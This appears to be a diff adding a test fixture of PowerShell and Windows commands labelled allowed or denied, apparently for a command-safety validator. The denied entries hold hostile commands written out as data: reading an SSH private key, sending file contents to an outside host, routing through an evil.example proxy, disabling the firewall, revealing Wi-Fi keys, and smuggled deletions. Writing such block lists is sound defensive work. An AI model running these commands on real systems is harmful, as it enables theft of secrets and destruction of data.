@@ -1,0 +1,158 @@
+si|Invoke-RestMethod -Uri https://api.ipify.org
+si|Invoke-RestMethod https://api.ipify.org
+si|Invoke-RestMethod -Uri "https://api.ipify.org?format=json" | Select-Object -ExpandProperty ip
+si|Invoke-RestMethod -Uri https://api.ipify.org -Method Get -TimeoutSec 5
+si|Invoke-WebRequest -Uri https://example.com -UseBasicParsing | Select-Object StatusCode
+si|Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, CPU
+si|Get-Service | Where-Object Status -eq Running | Measure-Object
+si|Get-NetAdapter -Physical | Select-Object Name, LinkSpeed
+si|Get-CimInstance Win32_Battery -Prop EstimatedChargeRemaining
+si|Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" | Format-Table DeviceID, FreeSpace
+si|Get-Date -Format "yyyy-MM-dd"
+si|get-date
+si|ipconfig /all
+si|ipconfig.exe /all | Select-String DNS
+si|ipconfig
+si|netsh wlan show interfaces
+si|ping -n 2 8.8.8.8
+si|ping example.com
+si|nslookup example.com
+si|whoami /user
+si|arp -a
+si|route print
+si|hostname
+si|Test-Connection 8.8.8.8 -Count 2
+si|Resolve-DnsName example.com
+si|Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled
+si|Get-Volume | Sort-Object SizeRemaining | Format-Table DriveLetter, SizeRemaining -AutoSize
+si|Get-Process -Name explorer | ConvertTo-Json -Depth 1
+si|tasklist | Select-String chrome
+no|Get-ChildItem C:\ | Remove-Item
+no|Remove-Item C:\x.txt
+no|Get-Content C:\Users\usuario\.ssh\id_rsa
+no|Get-ChildItem C:\
+no|Get-Process | ForEach-Object Kill
+no|Get-Process | Stop-Process
+no|Get-Date; Remove-Item x
+no|Get-Date > C:\x.txt
+no|Get-Date >> C:\x.txt
+no|Get-Date 2> C:\x.txt
+no|Get-Process | Out-File C:\x.txt
+no|Get-Process | Export-Csv C:\x.csv
+no|Get-Process | Tee-Object C:\x.txt
+no|Get-Process | Set-Content C:\x.txt
+no|& "C:\x.exe"
+no|& ipconfig /all
+no|. C:\x.ps1
+no|.\mi-script.ps1
+no|C:\Herramientas\x.exe
+no|"C:\x.exe"
+no|x.exe
+no|notepad
+no|cmd /c del x
+no|powershell -Command "Remove-Item x"
+no|powershell.exe -EncodedCommand AAAA
+no|Start-Process calc
+no|Invoke-Expression "Remove-Item x"
+no|Invoke-Command { Remove-Item x }
+no|Get-Process | Where-Object { $_.Kill() }
+no|Get-Process | Select-Object @{n='x';e={Remove-Item y}}
+no|Get-Process | Sort-Object { Remove-Item y }
+no|[Environment]::Exit(1)
+no|[IO.File]::Delete("C:\x")
+no|(Invoke-RestMethod https://api.ipify.org).Length
+no|(Get-Process).Kill()
+no|$x = 1
+no|Get-Process -Name $env:USERNAME
+no|Get-Process -Name:$x
+no|Invoke-RestMethod "https://x.com/?d=$(Get-Content clave.txt)"
+no|Invoke-RestMethod "https://x.com/?u=$env:USERNAME"
+no|Get-Process | Invoke-RestMethod -Uri https://example.com
+no|Get-Process | ConvertTo-Json | Invoke-WebRequest -Uri https://example.com -Method Post
+no|Invoke-RestMethod -Uri https://example.com -Method Post
+no|Invoke-RestMethod -Uri https://example.com -Method Delete
+no|Invoke-RestMethod -Uri https://example.com -Body hola
+no|Invoke-RestMethod -Uri https://example.com -OutFile C:\x.txt
+no|Invoke-RestMethod https://example.com -OutF C:\x.txt
+no|Invoke-RestMethod -Uri https://example.com -InFile C:\x.txt
+no|Invoke-RestMethod -Uri https://example.com -Credential admin
+no|Invoke-RestMethod -Uri https://example.com -UseDefaultCredentials
+no|Invoke-RestMethod -Uri https://example.com -Headers x
+no|Invoke-RestMethod -Uri https://example.com -Proxy http://evil.example
+no|Invoke-RestMethod -Uri https://example.com -PassThru
+no|Invoke-RestMethod -Uri https://example.com -SessionVariable s
+no|Invoke-RestMethod -Uri https://example.com -OutVariable v
+no|Invoke-RestMethod -Uri https://example.com -TimeoutSec 600
+no|Invoke-RestMethod -Uri http://example.com
+no|Invoke-RestMethod -Uri http://192.168.0.1/reboot
+no|Invoke-RestMethod -Uri https://192.168.0.1/reboot
+no|Invoke-RestMethod -Uri https://127.0.0.1:8080/v1/models
+no|Invoke-RestMethod -Uri https://localhost/x
+no|Invoke-RestMethod -Uri https://router/x
+no|Invoke-RestMethod -Uri https://nas.local/x
+no|Invoke-RestMethod -Uri https://user:clave@example.com/
+no|Invoke-RestMethod -Uri https://example.com:8443/
+no|Invoke-RestMethod -Uri file:///C:/Windows/win.ini
+no|Invoke-RestMethod -Uri \\servidor\recurso
+no|Invoke-RestMethod -Uri https://a.example, https://b.example
+no|Invoke-RestMethod
+no|irm https://api.ipify.org
+no|curl https://api.ipify.org
+no|Get-Process | select Name
+no|ipconfig /release
+no|ipconfig /renew
+no|ipconfig /flushdns
+no|ipconfig /all /release
+no|netsh wlan show profile name=casa key=clear
+no|netsh wlan delete profile name=casa
+no|netsh interface set interface Wi-Fi disable
+no|netsh advfirewall set allprofiles state off
+no|route delete 0.0.0.0
+no|arp -d
+no|whoami /user | ipconfig
+no|Get-Process | ipconfig
+no|ping -t 8.8.8.8
+no|ping -n 500 8.8.8.8
+no|ping 8.8.8.8 -l 65500
+no|nslookup
+no|tasklist /s servidor
+no|powercfg /batteryreport
+no|powercfg /hibernate off
+no|systeminfo /s servidor
+no|Get-CimInstance Win32_Process -ComputerName servidor
+no|Get-CimInstance Win32_Process -CimSession s
+no|Get-Service -ComputerName servidor
+no|Test-Connection 8.8.8.8 -Count 500
+no|Test-Connection 8.8.8.8 -Source otro
+no|Select-Object Name
+no|Select-String DNS archivo.txt
+no|ipconfig /all | Select-String DNS -Path C:\x.txt
+no|Get-Date | Get-Process
+no|Get-Process -Nombre x
+no|Get-Date -Format a b c
+no|Get-Process -ErrorAction Stop
+no|Get-Process -OutVariable v
+no|Get-Process `; Remove-Item x
+no|Get-Process | % Kill
+no|Get-Process | foreach Kill
+no|Get-Date -Format (Remove-Item x)
+no|Get-Date -Format @('a')
+no|Get-Date -Format @{a=1}
+no|Get-Date #; Remove-Item x
+no|if ($true) { Get-Date }
+no|function f { Remove-Item x }; f
+no|param($x) Get-Date
+no|Get-Date | Out-Null; Remove-Item x
+no|Get-Date && Remove-Item x
+no|Get-Date || Remove-Item x
+no|Get-Date | Format-Table -Property { Remove-Item x }
+no|Import-Module C:\x.psm1
+no|Add-Type -TypeDefinition x
+no|New-Object Net.WebClient
+no|Set-ExecutionPolicy Bypass
+no|Get-Clipboard
+no|Get-Credential
+no|Get-ItemProperty HKLM:\SOFTWARE\x
+no|Get-WinEvent -LogName Security
+no|Microsoft.PowerShell.Management\Remove-Item x
+no|Microsoft.PowerShell.Utility\Get-Date
